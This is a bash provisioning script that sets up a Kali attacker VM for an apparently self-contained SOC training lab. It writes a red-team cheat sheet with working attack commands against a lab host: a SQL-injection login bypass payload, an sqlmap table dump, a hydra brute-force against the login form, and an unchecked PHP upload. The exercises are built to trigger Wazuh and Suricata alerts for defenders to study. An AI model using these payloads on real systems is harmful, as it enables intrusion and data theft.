#!/usr/bin/env bash
# kali VM: the attacker on the RED network. Used for red team exercises
# against the target; nothing here is reachable from outside the lab.
set -euo pipefail
source /opt/minisoc/lib.sh

log "Installing attack tools"
apt_install nmap nikto sqlmap hydra gobuster curl

# KALI_GUI=true (lab.conf): a real XFCE desktop with Burp Suite, instead of
# CLI tools only. Gated behind the flag since a desktop adds real install
# time and disk/RAM (the Vagrantfile bumps KALI_MEMORY to >=4096 for this).
# Autologin is console-only (VirtualBox's own GUI window, opened from the
# host) - it never touches SSH or the network, so it doesn't reopen the
# vagrant:vagrant network-reachable credential base.sh deliberately closed.
if [ "${KALI_GUI:-false}" = "true" ]; then
    log "KALI_GUI=true: installing the XFCE desktop, Burp Suite and guest additions"
    apt_install kali-desktop-xfce lightdm burpsuite virtualbox-guest-x11

    mkdir -p /etc/lightdm/lightdm.conf.d
    cat > /etc/lightdm/lightdm.conf.d/50-minisoc-autologin.conf <<'EOF'
# Mini-SOC: autologin straight to the desktop. Console-only (the
# VirtualBox GUI window on the host) - not an SSH or network login, so
# this doesn't reintroduce the vagrant:vagrant network-reachable
# credential that base.sh locks everywhere else.
[Seat:*]
autologin-user=vagrant
autologin-user-timeout=0
EOF
    systemctl set-default graphical.target
    systemctl enable lightdm >/dev/null

    # xfce4-screensaver ships enabled by default and locks the session after
    # an idle timeout - a real lockout here, not an inconvenience, since
    # base.sh has already locked vagrant's password (no console password
    # exists that could ever unlock it again; recovering needs `vagrant ssh`
    # and `xfce4-screensaver-command --deactivate`, found the hard way).
    # Disabled per-user via the standard XDG autostart override (a same-
    # named file under ~/.config/autostart with Hidden=true) rather than
    # touching the package's own /etc/xdg/autostart entry.
    install -d -m 755 -o vagrant -g vagrant /home/vagrant/.config/autostart
    cat > /home/vagrant/.config/autostart/xfce4-screensaver.desktop <<'EOF'
[Desktop Entry]
Hidden=true
EOF
    chown vagrant:vagrant /home/vagrant/.config/autostart/xfce4-screensaver.desktop
else
    log "KALI_GUI=false: staying CLI-only (no desktop installed)"
fi

# Older builds of this lab shipped a dvwa-bruteforce.py workaround script -
# no longer needed since the current target app's login has no CSRF token
# for hydra to fight. Clean up the stale copy so a re-provisioned VM
# doesn't leave it lying around as a dead giveaway.
rm -f /home/vagrant/dvwa-bruteforce.py

# A small curated list, not full rockyou: fast enough for a live demo,
# still includes the real password so the exercise actually succeeds.
cat > /home/vagrant/passwords.txt <<'TXT'
123456
admin
letmein
qwerty
Welcome1
changeme
TXT
chown vagrant:vagrant /home/vagrant/passwords.txt

# Short cheat sheet for the first exercises
cat > /home/vagrant/EXERCISES.txt <<'TXT'
Mini-SOC red team exercises (target: 10.10.20.10)

target's front page (http://10.10.20.10/) is a normal-looking "Northgate
Defense Systems" site - no hint of a training app. The actual vulnerable
app - a small, hand-written internal "Employee Portal", not a known
training tool - is still there, just not linked from anywhere, and its
login credentials are never just handed to you either: both are found
the way they'd really happen, through recon, SQL injection or a brute
force.

1. Port scan:      nmap -sV 10.10.20.10
2. Web scan:       nikto -h http://10.10.20.10/
3. Find the hidden app: gobuster dir -u http://10.10.20.10/ \
                     -w /usr/share/wordlists/dirb/common.txt
                     (turns up /legacy/ - an old internal tool
                     nobody decommissioned)
4. SQL injection (bypass, no password needed):
                   curl -s -G http://10.10.20.10/legacy/login.php \
                     --data-urlencode "username=' UNION SELECT 1,'admin','x'-- -" \
                     --data-urlencode 'password=x'
                   or automate it: sqlmap -u "http://10.10.20.10/legacy/login.php?username=admin&password=x" \
                     --batch --dump -D portal -T users
5. Brute-force the login (alternative to SQLi): hydra -l admin -P ~/passwords.txt \
                     10.10.20.10 http-post-form \
                     '/legacy/login.php:username=^USER^&password=^PASS^:F=Login failed'
                   No CSRF token to fight here (unlike the old DVWA-based
                   version of this lab) - hydra just works.
6. File upload:    log in (either way above), then POST a .php file to
                     dashboard.php's upload form - no checks at all. The
                     Wazuh agent on target watches /var/www/html in real
                     time (FIM) and alerts the moment the file lands.
Then check what Suricata/Wazuh raised:
  - Wazuh dashboard (https://localhost:8444) -> Discover, index pattern
    "wazuh-alerts-*", filter by rule group "minisoc_ids" or "web".
  - DFIR-IRIS (https://localhost:8445): level >= 10 alerts become cases
    automatically, with your IP as an indicator and target as the asset.
See the README's "Red team exercise" section for the full walkthrough.

If KALI_GUI=true in lab.conf, a desktop is also installed with Burp Suite
on it - everything above works just as well driven through Burp's
Proxy/Repeater instead of curl/sqlmap (set the browser proxy to
127.0.0.1:8080 and install Burp's CA cert to intercept target traffic).
TXT
chown vagrant:vagrant /home/vagrant/EXERCISES.txt

rm -rf /tmp/minisoc-kali
if [ "${KALI_GUI:-false}" = "true" ]; then
    log "Kali ready (10.10.66.10), desktop + Burp Suite installed, exercises in ~/EXERCISES.txt"
else
    log "Kali ready (10.10.66.10), CLI tools only, exercises in ~/EXERCISES.txt"
fi
